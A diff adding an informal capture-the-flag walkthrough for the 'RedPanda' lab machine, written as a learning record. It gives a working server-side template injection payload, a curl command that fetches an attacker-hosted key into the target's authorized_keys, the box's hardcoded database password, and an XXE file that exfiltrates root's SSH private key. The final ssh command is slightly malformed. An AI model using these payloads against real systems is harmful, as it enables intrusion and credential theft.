@@ -1,0 +1,93 @@
+to start we do an Nmap scan the usual 
+
+we find port 22 ssh and port 8080 http 
+
+navigate to http and we find a webpage 
+
+tested a buch of syntax but certain characters are banned such as $ and #
+
+allows for user input so we test a couple simple injections i find that *{7*7} works to get us 49 so we have server side template injection
+
+usefull url with sample injections "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java---basic-injection"
+
+his java retrive /etc/passwd injection dosent work as $ is banned swap it for * and we get the /etc/passwd file 
+
+"*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}"
+
+find that the command uses a java ASCII to deciaml table. code a quick and dirty program to convert commands typed into a server side template injection.
+
+the conversion allows us to bypass character lockout so now we can enumerate using ls /
+
+buch of directories but if we follow the home path we find a user "woodenk" same as the /etc/passwd file 
+
+we see user.txt cat that out and we get our user flag  we also can use the ls -la command to look for hidden directories 
+
+see .ssh directory and we can enumerate it 
+
+"ssh-keygen" on our machine and then spin up a python server with the command "python -m http.server 80"
+
+then we inject the curl command and pull out pub rsa key "curl http://<YOUR IP>:<PORT>/id_rsa.pub -o /home/woodenk/.ssh/authorized_keys"
+
+then we change the perms on the key "chmod 600 /home/woodenk/.ssh/authorized_keys"
+
+attempt ssh "ssh -i id_rsa woodenk@<BOX IP>" 
+
+it requests password still so ssh wont work for now
+
+go back to enumeration and we find hardcoded creds in "/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java"
+
+conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
+
+try ssh again and try "RedPandazRule" it works we now have ssh for woodenk
+
+load up linpease and run it we find a couple things but nothing that i could get working 
+
+find in the /opt/ a file called cleanup.sh
+
+``` cleanup.sh
+#!/bin/bash
+/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
+/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
+/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
+/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
+
+```
+we need a jpg and an xml document to get priv escelatio here (im going to do some more research here and see if there a better way of explaining this)
+
+download random.jpg form the interwebs 
+
+exiftool -Artist="../home/woodenk/random.jpg" random.jpg
+
+create another file called random_creds.xml and imput this file is going to store the priv root ssh key so we can ssh in as root
+
+``` random_creds.xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa"> ]>
+<credits>
+	<author>damian</author>
+	<image>
+		<uri>/../../../../../../../home/woodenk/random.jpg</uri>
+		<hello>&ent;</hello>
+		<views>0</views>
+	</image>
+	<totalviews>0</totalviews>
+</credits>
+
+```
+spin up a python server
+
+curl both files to the woodenk home directory keep the names the same 
+
+then spin up burpsuite and go to the redpanda webpage
+
+make a request for your random.jpg and change the user agent field to ||/../../../../../../../home/woodenk/random.jpg
+
+once this is done if you did it correct then cat the random_creds.xml and you should see the priv key for the root user 
+
+copy the key to a file and use ssh to connect a root "ssh -i root.priv@10.10.11.170" dont forget to chmod 600 the key
+
+now just ls the home dirctory and theres the flag!
